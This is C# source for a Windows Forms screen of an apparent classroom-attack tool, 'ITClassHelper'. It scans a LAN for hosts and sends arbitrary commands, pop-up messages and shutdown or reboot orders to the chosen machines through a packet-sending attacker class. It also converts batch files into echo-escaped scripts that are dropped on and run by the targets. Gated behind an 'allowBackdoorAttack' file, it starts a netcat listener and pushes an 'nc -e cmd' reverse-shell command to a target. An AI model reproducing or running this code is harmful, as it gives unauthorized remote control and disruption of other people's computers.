using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace ITClassHelper
{
    public partial class FormDeviceManage : Form
    {
        static bool firstTimeNcClientAttack = true;
        static readonly string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ITClassHelper";
        static readonly string ncPath = path + @"\nc.exe";
        static readonly string allowBackdoorFilePath = path + @"\allowBackdoorAttack.txt";

        public FormDeviceManage()
        {
            InitializeComponent();
            if (File.Exists(allowBackdoorFilePath))
            {
                NcServerButton.Visible = NcServerButton.Enabled = NcClientButton.Enabled = true;
            }
        }

        private void ScanButton_Click(object sender, EventArgs e)
        {
            int rangeStart = int.Parse(IPTextBox.Text.Split('.')[3]);
            int rangeEnd = int.Parse(IPRangeTextBox.Text);
            string ipStart = IPTextBox.Text;
            if (rangeEnd - rangeStart + 1 >= 5)
            {
                if (MessageBox.Show("扫描数量大于或等于 5 个，扫描速度可能很慢！\n按[确定]继续扫描；\n按[取消]放弃扫描。", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.Cancel) return;
            }
            DeviceList.Items.Clear();
            ScanButton.Text = "扫描中！"; ScanButton.Enabled = false; Cursor = Cursors.WaitCursor;
            new Thread(x =>
            {
                for (int i = rangeStart; i <= rangeEnd; i++)
                {
                    Ping ping = new Ping();
                    PingReply reply;
                    try
                    {
                        reply = ping.Send($"{ipStart.Substring(0, ipStart.Length - (1 + rangeStart.ToString().Length))}.{i}", 1000);
                    }
                    catch (PingException)
                    {
                        return;
                    }
                    if (reply.Status == IPStatus.Success)
                    {
                        DeviceList.Items.Add(reply.Address.ToString());
                        if (DisableMacAddressCheckBox.Checked == false) DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add(GetMacByIP(reply.Address.ToString()));
                        if (DisableHostNameCheckBox.Checked == false) DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add(Dns.GetHostEntry(reply.Address).HostName);
                    }
                }
                ScanButton.Text = "扫描"; ScanButton.Enabled = true; Cursor = Cursors.Default;
            }){ IsBackground = true }.Start();
        }

        private static string GetMacByIP(string ip)
        {
            int ldest = Tools.inet_addr(ip);
            string mac = "";
            try
            {
                long macinfo = 0;
                int len = 6;
                int result = Tools.SendARP(ldest, 0, ref macinfo, ref len);
                mac = Convert.ToString(macinfo, 16);
            }
            catch { }
            mac = "000000000000" + mac;
            mac = mac.Substring(mac.Length - 12);
            return mac.Substring(10, 2).ToUpper() + "-" + mac.Substring(8, 2).ToUpper() + "-"
                + mac.Substring(6, 2).ToUpper() + "-" + mac.Substring(4, 2).ToUpper() + "-"
                + mac.Substring(2, 2).ToUpper() + "-" + mac.Substring(0, 2).ToUpper();
        }

        private string[] GetCheckedIPs()
        {
            string[] ips = new string[DeviceList.CheckedItems.Count];
            for (int i = 0; i <= DeviceList.CheckedItems.Count - 1; i++) ips[i] = DeviceList.CheckedItems[i].Text;
            return ips;
        }

        private void SendCmdMenuItem_Click(object sender, EventArgs e)
        {
            string command = Interaction.InputBox("请输入要发送的命令：", "信息", "", -1, -1);
            PackAttacker.SendPack(command, GetCheckedIPs(), int.Parse(PortTextBox.Text));
        }

        private void SendMsgMenuItem_Click(object sender, EventArgs e)
        {
            string message = Interaction.InputBox("请输入要发送的消息：", "信息", "", -1, -1);
            string msgMethod = Interaction.InputBox("请选择发送模式：\n1：原生方法+远程显示（稳定、不引人注意）\n2：原生方法+本地发送（较不稳定、不引人注意）\n3：[制作中！]教室方法+本地发送（稳定、引人注意）", "信息", "", -1, -1);
            switch (msgMethod)
            {
                case "1":
                    PackAttacker.SendPack($"msg * {message}", GetCheckedIPs(), int.Parse(PortTextBox.Text));
                    break;

                case "2":
                    foreach (string ip in GetCheckedIPs())
                    {
                        Tools.ExecuteProcess("msg", $"/server:{Dns.GetHostEntry(ip).HostName} * {message}");
                    }
                    break;

                default:
                    break;
            }
        }

        private void SendScriptMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog fileDialog = new OpenFileDialog
            {
                Multiselect = false,
                Title = "选择脚本文件",
                Filter = "已处理的脚本(*.iscp)|*.iscp"
            };
            if (fileDialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    using (StreamReader sr = new StreamReader(fileDialog.FileName))
                    {
                        string fileLine;
                        while ((fileLine = sr.ReadLine()) != null) PackAttacker.SendPack(fileLine, new string[] { IPTextBox.Text }, int.Parse(PortTextBox.Text));
                    }
                }
                catch (ArgumentNullException) { MessageBox.Show("还没有选择脚本！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error); }

            }
        }

        private void ScripterMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog fileDialog = new OpenFileDialog
            {
                Multiselect = false,
                Title = "选择脚本文件",
                Filter = "原始BAT脚本(*.bat)|*.bat"
            };
            if (fileDialog.ShowDialog() == DialogResult.OK)
            {
                string scriptPath = fileDialog.FileName;
                int lines = 0;
                FileStream fs = new FileStream(scriptPath, FileMode.OpenOrCreate, FileAccess.ReadWrite);
                StreamReader lineSr = new StreamReader(fs);
                while (lineSr.ReadLine() != null)
                {
                    lines++;
                }
                fs.Close();
                lineSr.Close();
                string scriptName = Interaction.InputBox("请输入脚本文件名：", "信息", "", -1, -1);
                List<string> newLines = new List<string>(lines + 2);
                using (StreamReader sr = new StreamReader(scriptPath))
                {
                    newLines.Add($@"del /f /q C:\{scriptName}");
                    string line, newLine = "";
                    while ((line = sr.ReadLine()) != null)
                    {
                        newLine = "echo ";
                        foreach (char c in line)
                        {
                            if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))
                                newLine += c;
                            else newLine += "^" + c;
                        }
                        newLine += $@" >>C:\{scriptName}";
                        newLines.Add(newLine);
                    }
                    newLines.Add($@"start C:\{scriptName}");
                }
                using (StreamWriter sw = new StreamWriter(scriptName.Split('.')[0] + ".iscp"))
                {
                    foreach (string s in newLines)
                    {
                        sw.WriteLine(s);
                    }
                }
                MessageBox.Show($@"脚本已保存到 {Directory.GetCurrentDirectory()}\{scriptName}！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void ShutdownMenuItem_Click(object sender, EventArgs e)
        {
            ShutdownRebootInteractor("shutdown");
        }

        private void RebootMenuItem_Click(object sender, EventArgs e)
        {
            ShutdownRebootInteractor("reboot");
        }

        private void ShutdownRebootInteractor(string shutdownType)
        {
            string shutdownMethod;
            if (shutdownType == "shutdown")
            {
                 shutdownMethod = Interaction.InputBox("请选择关机模式：\n1：原生方法+本地发送（较不稳定）\n2：原生方法+本地发送（较稳定、可自定义）\n3：教室方法+本地发送（稳定）", "信息", "", -1, -1);
            }
            else
            {
                shutdownMethod = Interaction.InputBox("请选择重启模式：\n1：原生方法+本地发送（较不稳定）\n2：原生方法+本地发送（较稳定、可自定义）\n3：教室方法+本地发送（稳定）", "信息", "", -1, -1);
            }
            switch (shutdownMethod)
            {
                case "1":
                    foreach (string ip in GetCheckedIPs())
                    {
                        if (shutdownType == "shutdown")
                        {
                            Tools.ExecuteProcess("shutdown", $"/m \\\\{Dns.GetHostEntry(ip).HostName} /s /t 0");
                        }
                        else
                        {
                            Tools.ExecuteProcess("shutdown", $"/m \\\\{Dns.GetHostEntry(ip).HostName} /r /t 0");
                        }
                    }
                    break;

                case "2":
                    Tools.ExecuteProcess("shutdown", "/i", true);
                    break;

                case "3":
                    PackAttacker.SendPack("shutdown /s /t 0", GetCheckedIPs(), int.Parse(PortTextBox.Text));
                    break;

                default:
                    break;
            }
        }

        private void ConvertHostNameIPButton_Click(object sender, EventArgs e)
        {
            string resultIP = "";
            try
            {
                foreach (IPAddress curAddress in Dns.GetHostEntry(HostNameTextBox.Text).AddressList)
                {
                    if (curAddress.AddressFamily == AddressFamily.InterNetwork)
                    {
                        resultIP = curAddress.ToString();
                    }
                }
                MessageBox.Show($"目标 IP 地址为：{resultIP}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (SocketException)
            {
                MessageBox.Show("找不到此计算机！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void IPButton_Click(object sender, EventArgs e)
        {
            MessageBox.Show($"IP 地址为：{Tools.GetIPAddress()}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void NcServerButton_Click(object sender, EventArgs e)
        {
            Process[] ncProcs = Process.GetProcessesByName("nc");
            if (ncProcs.Length == 0)
            {
                Tools.ExecuteProcess(ncPath, "-lvnp 4242", true);
                NcServerButton.Text = "关闭服务器";
            }
            else
            {
                foreach (Process ncProc in ncProcs)
                {
                    ncProc.Kill();
                }
                NcServerButton.Text = "启动服务器";
            }
        }

        private void NcClientButton_Click(object sender, EventArgs e)
        {
            if (!File.Exists(allowBackdoorFilePath)) Tools.ExecuteProcess(ncPath, $"-e cmd {IPTextBox.Text} 4242");
            else
            {
                PackAttacker.SendPack($"{ncPath} -e cmd {Tools.GetIPAddress()} 4242", new string[] { IPTextBox.Text }, int.Parse(PortTextBox.Text));
                if (firstTimeNcClientAttack == true)
                {
                    MessageBox.Show("NetCat 只能同时对一个 IP 地址攻击！", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    firstTimeNcClientAttack = false;
                }
            }
        }
    }
}
